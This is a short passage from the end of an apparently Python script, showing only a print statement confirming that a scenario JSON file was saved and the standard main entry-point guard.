        print(f"[✓] Saved scenario JSON to: {out_path}")


if __name__ == "__main__":
    main()
